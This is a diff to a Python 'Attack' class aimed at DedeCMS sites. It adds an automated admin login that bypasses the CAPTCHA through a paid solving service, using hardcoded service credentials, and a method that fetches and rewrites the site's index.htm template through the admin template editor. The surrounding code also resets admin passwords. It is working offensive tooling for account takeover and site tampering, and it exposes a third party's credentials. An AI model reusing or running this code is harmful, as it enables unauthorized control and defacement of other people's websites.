@@ -84,11 +84,29 @@ class Attack:
             login_url = "%s/login.php" % self.back_ground_url
             login_form = {"dopost": "login",
                           "adminstyle": "newdedecms",
+                          "validate": "",
+                          "gotopage": self.back_ground_url+"/index.php",
                           "userid": self.user,
                           "pwd": self.pwd}
-            utils.my_requests(login_url, timeout=60, requester=self.session)
-            utils.my_requests(method="post", url=login_url, data=login_form, allow_redirects=True, timeout=120,
-                              requester=self.session)
+            res = utils.my_requests(login_url, timeout=60, requester=self.session)
+            try:
+                self.charset = res.apparent_encoding
+            except Exception as e:
+                print("%s:编码识别错误" % self.domain)
+            # if "vdimgck" in re.sub("(?=<!--)[\s\S]+(?<=-->)","",res.text):
+            if 1 == 1:
+                res = utils.my_requests(self.domain + self.vcode_url, timeout=10, requester=self.session)
+                img_path = "./vcode/%d.jpg" % int(time.time())
+                with open(file=img_path, mode="wb") as fp:
+                    fp.write(res.content)
+                img = Image.open(img_path)
+                vcode_v = utils.base64_api(uname='danche', pwd='qq199605', img=img)
+                if "余额不足" in vcode_v:
+                    return False
+                login_form.update({"validate": vcode_v})
+            res = utils.my_requests(method="post", url=login_url, data=login_form, allow_redirects=True, timeout=120,requester=self.session)
+            if "验证码不正确" in res.text:
+                return False
             return True
         except Exception as e:
             traceback.print_exc()
@@ -193,3 +211,38 @@ class Attack:
                 return {"domain": self.domain, "res": False, "info": "更新后台admin密码失败"}
         res = self.reset_back_admin()
         return res
+
+    def edit_templates(self,):
+        global content
+        try:
+            res = self._login_admin()
+            if not res:
+                return {"domain": self.domain, "res": False, "info": "后台登录失败:%s" % self.user}
+            else:
+                print('后台登录成功')
+                acdir_url = "%s/templets_main.php" % self.back_ground_url
+                a = utils.my_requests(method="get", url=acdir_url, requester=self.session)
+                try:
+                    acdir = re.findall(r"(?<=action=upload&acdir=)\S+(?='>)", a.text)[0]
+                except Exception as e:
+                    acdir = "admin"
+                eidt_url = self.back_ground_url + '/tpl.php?action=edit&acdir=%s&filename=index.htm' % acdir
+                edit_content = utils.my_requests(method="get", url=eidt_url, requester=self.session)
+                edit_content.encoding = edit_content.apparent_encoding
+                try:
+                    content = re.findall(r'(<textarea id="content" .*?>([\s\S]*?)</textarea>)', edit_content.text)[0][1]
+                    # 处理content内容
+                    content = content.encode(self.charset)
+                except Exception as e:
+                    print(e)
+                post_form = {"action": "saveedit",
+                             "acdir": acdir,
+                             "filename": 'index.htm',
+                             "content": content
+                             }
+                self.heders['Content-Type'] = 'application/x-www-form-urlencoded,charset=%s' % self.charset
+                res = utils.my_requests(method="post", url=self.back_ground_url + "/tpl.php", headers=self.heders,data=post_form,allow_redirects=True, timeout=120, requester=self.session)
+                if "成功修改" in res.text:
+                    return {"domain": self.domain, "res": True, "info": "success"}
+        except Exception as e:
+            print(e)
